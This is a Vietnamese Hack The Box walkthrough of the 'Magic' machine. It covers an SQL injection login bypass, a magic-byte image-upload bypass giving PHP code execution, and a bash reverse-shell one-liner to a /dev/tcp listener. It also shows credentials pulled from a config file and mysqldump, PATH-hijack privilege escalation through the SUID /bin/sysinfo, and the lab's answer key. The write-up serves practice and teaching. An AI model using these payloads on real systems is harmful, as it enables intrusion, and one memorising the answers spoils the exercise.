![image](https://hackmd.io/_uploads/S1XEPvfcC.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/241/information) 

## Comment
Đây là một máy dựa vào lỗ hổng file upload để RCE sau đó tiến hành leo quyền dựa vào SUID và thao túng đường dẫn $PATH

# Recon
## nmap 
Sau khi nmap ta scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS 10.10.10.185                                
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 11:46 EDT
Nmap scan report for 10.10.10.185
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.06 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.10.185 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 11:46 EDT
Nmap scan report for 10.10.10.185
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds
```
## Port 80 - http
Truy cập vào trang web nó mặc định sẽ kết nối đến http://10.10.10.185/ 

Trang web chỉ có tính năng login và xem ảnh, ta sẽ chuyển đến trang login 

![image](https://hackmd.io/_uploads/B1gG4iwG5R.png)

## Gobuster 
Để chắc chắn không có path nào bị ẩn có thể khai thác
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.185
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 302)
/logout.php (Status: 302)
/server-status (Status: 403)
```
# User flag
## Exploit
Sử dụng câu truy vấn SQLi đơn giản và bypass được vào trang login: `a' or 1=1 -- ` **http://10.10.10.185/upload.php** 

![image](https://hackmd.io/_uploads/Sk5E2vf5C.png)

Tại giao diện http://10.10.10.185/upload.php nó cho phép cho ta upload 3 loại file ảnh **jpg, jpeg, png**

![image](https://hackmd.io/_uploads/SJP3nPM5C.png)

Trước tiên sẽ thử up một file ảnh thông thường lên, thấy được thông báo ảnh sau khi upload lên thành công

![image](https://hackmd.io/_uploads/SkoQaPGqA.png)

Khi quay lại trang chính ta sẽ thấy ảnh được up lên thành công và nằm ở **/images/uploads**

![image](https://hackmd.io/_uploads/HymO6Dzq0.png)

### File Upload
#### Extension file
Vì server chặn các file có thể chỉ mình `.php` nên ta sẽ up các file khác như `.phtml`, `php5`, `.php3` đều không được

![image](https://hackmd.io/_uploads/S15Tz_M90.png)

#### Giả mạo đuôi file
Đặt tên file là `a.php.png` và gửi lên server, một cảnh báo khác cũng xuất hiện

![image](https://hackmd.io/_uploads/SkZX7ufcC.png)

#### Magic byte
Một số server nhận là file ảnh bằng **header signature**. Việc đổi byte header hoặc chèn shell code cũng có thể giả mạo khiến server hiểu nó là file ảnh

![image](https://hackmd.io/_uploads/B1CiUOz5R.png)

![image](https://hackmd.io/_uploads/Hk9i6_z5R.png)

Sau khi upload lên, bắt đầu chạy shell

![image](https://hackmd.io/_uploads/Sk-xCuzqR.png)

Sử dụng `/bin/bash -c 'bash -i > /dev/tcp/10.10.14.93/1234 0>&1'` để có được reverse shell

![image](https://hackmd.io/_uploads/SJH7ZYM5R.png)

## Post-Exploit
### Lateral Movement 
cd qua `home` để lấy user flag nhưng không có quyền đọc file, vì thế tiếp tục tìm xem có gì khac 

![image](https://hackmd.io/_uploads/HJy8fYG5A.png)

Tại `/var/www/Magic` ta tháy được 1 file db chứa thông tin của 1 database
```
ls 
assets
db.php5
images
index.php
login.php
logout.php
upload.php
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```
#### Mysqldump
Mysqldump là một công cụ dòng lệnh được cung cấp bởi MySQL để sao lưu cơ sở dữ liệu. Việc có credential của người dùng sẽ giúp ta có thể xem được các câu truy vấn mà người dùng đã sử dụng
```
mysqldump --user=theseus --password=iamkingtheseus Magic
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
<SNIP>
```
Có một câu lệnh INSERT làm ta chú ý
```
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
Chuyển sang user khác bằng lệnh su

![image](https://hackmd.io/_uploads/r1n_vFzcA.png)

Lỗi này xuất hiện vì khi sudo trong một môi trường không có quyền truy cập vào TTY (như khi chạy trong một script không tương tác hoặc qua một hệ thống tự động hóa), sudo không thể yêu cầu mật khẩu từ người dùng. sudo thường yêu cầu mật khẩu qua TTY để xác thực quyền truy cập.

Để khắc phục ta dùng lệnh
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@magic:/var/www/Magic$ su admin
su admin
No passwd entry for user 'admin'
www-data@magic:/var/www/Magic$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@magic:/var/www/Magic$ whoami
whoami
```

```
theseus@magic:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
theseus@magic:~$ cat user.txt
cat user.txt
45bb545aacee94796**********
```
# Root flag
## Exploit
Sử dụng lệnh để tìm SUID: `find / -type f -perm -04000 -ls 2>/dev/null`

![image](https://hackmd.io/_uploads/HkvMzqG5A.png)

Ta sẽ dùng `/bin/sysinfo` để leo quyền

### /bin/sysinfo
Các lệnh mà nó gọi để lấy thông tin hệ thống.

![image](https://hackmd.io/_uploads/S1_bo5MqR.png)

Nhìn vào phần `CPU Info` thấy chương trình dùng `cat /proc/cpuinfo` thay vì
`/bin/cat /proc/cpuinfo` . Thư mục `/bin` chứa nhị phân `cat` được bao gồm trong biến môi trường PATH của người dùng. Biến PATH được hệ thống sử dụng để xác định các thư mục cần tìm kiếm để xác định vị trí tệp nhị phân.

```
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@magic:/tmp$ 
```

Hệ điều hành lần lượt tìm kiếm các thư mục, bắt đầu từ thư mục đầu tiên. Trong trường hợp của chúng ta, thư mục đầu tiên mà HĐH sẽ tìm kiếm là `/usr/bin/local` . Nếu tập tin thực thi không được định vị ở đó, nó sẽ tiếp tục tìm kiếm trong thư mục tiếp theo, v.v. Hành vi này có thể bị lợi dụng
bằng cách sửa đổi biến PATH để chứa một thư mục mà người dùng hiện tại của chúng tôi có thể ghi được. Người dùng được phép sửa đổi biến và thêm một thư mục. 

### cat
Tạo 1 file tên `cat`, content của nó do chúng ta quyết định, gán nó vào PATH variable. Khi binary có SUID được chạy (sysinfo), thì `cat` cũng được chạy với quyền root (do SUID này do Root gắn)

Tạo một file tên cat, content của nó dùng để đọc flag

```
echo "strings /root/root.txt" > cat
theseus@magic:~$ cat cat
cat cat
strings /root/root.txt
```
Sau đó kéo về /tmp/ của machine, Command leo quyền như sau:
```
theseus@magic:~$ mv cat /tmp
mv cat /tmp
theseus@magic:~$ cd /tmp
cd /tmp
theseus@magic:/tmp$ ls
ls
cat
theseus@magic:/tmp$ chmod 777 cat
chmod 777 cat
theseus@magic:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
theseus@magic:/tmp$ sysinfo
```
## Post-Exploit
Thông qua sysinfo thì được do nó có SUID, khi Path variable đã được gán, command chỉ là sysinfo, và kết quả:

![image](https://hackmd.io/_uploads/By20QqM9R.png)

# Results
1. How many open TCP ports are listening on Magic? --> 2
2. What is the relative path of the page on the webserver that a user is redirected to on successfully logging in? --> /upload.php
3. The site claims that only three file extensions are allowed to be uploaded. They are jpg, jpeg, and what? --> png
4. What is the relative path of the directory that uploaded images are saved in? --> /images/uploads
5. Will the Apache directive <FilesMatch ".+\.php"> only match on files ending with .php? --> no
6. What user is the webserver running as? --> www-data
7. What is the theseus user's password for MySQL? --> iamkingtheseus
8. What is the theseus user's password on Magic? --> Th3s3usW4sK1ng
9. Submit the flag located in the theseus user's home directory. --> 45bb545aacee94796**********
10. What is the full path of the binary that is custom to Magic and configured with the SetUID bit on? --> /bin/sysinfo
11. What Linux binary is called by sysinfo to get the Hardware Info? --> lshw
12. What Bash environment variable can we modify for our current session to change which binary is called by sysinfo? Don't include a leading $. --> PATH
13. Submit the flag located in the root user's home directory. --> bfde20eb77c11a0cac1******

![image](https://hackmd.io/_uploads/H179Scz9A.png)
